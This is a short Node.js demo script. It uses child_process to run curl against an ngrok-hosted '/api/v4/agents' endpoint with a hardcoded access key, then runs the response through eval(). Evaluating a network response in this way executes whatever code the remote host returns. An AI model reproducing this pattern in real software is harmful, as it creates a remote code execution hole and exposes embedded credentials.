const axios = require("axios");
const childProcess = require("child_process");

demo()

async function demo() {
    let result = await execCommand("curl -X GET --header 'Accept: application/json' --header 'AccessKey: EamQu0G5aiKe7oa8' 'https://561e-27-4-99-136.in.ngrok.io:443/api/v4/agents' -s")

    result = await eval(result.replace(/\$id/g, 'id'));
    console.log(result);
}

async function execCommand(command) {
    return new Promise((resolve, reject) => {
        childProcess.exec(command, (error, stdout, stderr) => {
            if (error) {
                console.error(stdout);
                return reject(error);
            }

            let newStdout = stdout;
            if (stderr && !stdout) {
                newStdout = `${stderr}\nSuccess!`;
            }
            return resolve(newStdout);
        });
    });
}

function filterId(data) {
    return JSON.parse(JSON.stringify(data), function (k, v) {
        return k === '$id' ? undefined : v;
    });
}
